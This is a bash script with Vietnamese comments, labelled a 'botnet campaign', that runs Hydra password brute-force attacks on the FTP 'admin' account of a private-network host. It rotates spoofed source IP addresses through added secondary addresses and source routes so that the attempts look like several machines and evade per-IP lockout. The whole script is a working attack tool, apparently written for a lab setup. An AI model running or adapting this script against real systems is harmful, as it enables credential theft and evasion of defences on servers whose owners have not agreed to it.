#!/bin/bash

# --- CẤU HÌNH ---
TARGET="192.168.73.137" 
PASS_FILE="test_medium.txt"
IFACE="eth0"  # Đảm bảo tên này đúng với máy Kali của bạn

echo "=========================================="
echo "    CHIẾN DỊCH BOTNET V4 (ROUTING HACK)"
echo "=========================================="

# Dọn dẹp trước khi chạy
sudo killall hydra 2>/dev/null
# Xóa các route cũ nếu lỡ còn sót
sudo ip route del $TARGET 2>/dev/null
sudo ip addr del 192.168.73.135/24 dev $IFACE 2>/dev/null
sudo ip addr del 192.168.73.136/24 dev $IFACE 2>/dev/null

# ---------------------------------------------------------
# PHASE 1: TẤN CÔNG TỪ IP GỐC (.134)
# ---------------------------------------------------------
echo ""
echo "[1/3] Tấn công từ IP GỐC (.134)..."
hydra -l admin -P $PASS_FILE ftp://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID1=$!
echo "      -> Hydra (PID: $PID1) đang chạy..."
echo "      -> Đợi 10s..."
sleep 10
sudo kill $PID1 2>/dev/null

# ---------------------------------------------------------
# PHASE 2: TẤN CÔNG TỪ .135 (Magic Routing)
# ---------------------------------------------------------
echo ""
echo "[2/3] Giả danh IP .135..."

# 1. Thêm IP phụ vào card mạng
sudo ip addr add 192.168.73.135/24 dev $IFACE

# 2. [QUAN TRỌNG NHẤT] Ép đường đi đến Ubuntu PHẢI dùng nguồn .135
# Lệnh này nói: "Muốn đến máy Target, phải đi bằng IP .135"
sudo ip route add $TARGET dev $IFACE src 192.168.73.135

echo "      -> Route đã thêm: $(ip route show | grep $TARGET)"
echo "      -> Đang tấn công từ .135..."

hydra -l admin -P $PASS_FILE ftp://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID2=$!
sleep 10
sudo kill $PID2 2>/dev/null

# Dọn dẹp Phase 2
sudo ip route del $TARGET
sudo ip addr del 192.168.73.135/24 dev $IFACE

# ---------------------------------------------------------
# PHASE 3: TẤN CÔNG TỪ .136 (Magic Routing)
# ---------------------------------------------------------
echo ""
echo "[3/3] Giả danh IP .136..."

# 1. Thêm IP phụ
sudo ip addr add 192.168.73.136/24 dev $IFACE

# 2. Ép route nguồn .136
sudo ip route add $TARGET dev $IFACE src 192.168.73.136

echo "      -> Route đã thêm: $(ip route show | grep $TARGET)"
echo "      -> Đang tấn công từ .136..."

hydra -l admin -P $PASS_FILE ftp://$TARGET -t 4 -w 1 > /dev/null 2>&1 &
PID3=$!
sleep 10
sudo kill $PID3 2>/dev/null

# Dọn dẹp Phase 3
sudo ip route del $TARGET
sudo ip addr del 192.168.73.136/24 dev $IFACE

echo ""
echo "[DONE] Đã hoàn tất."
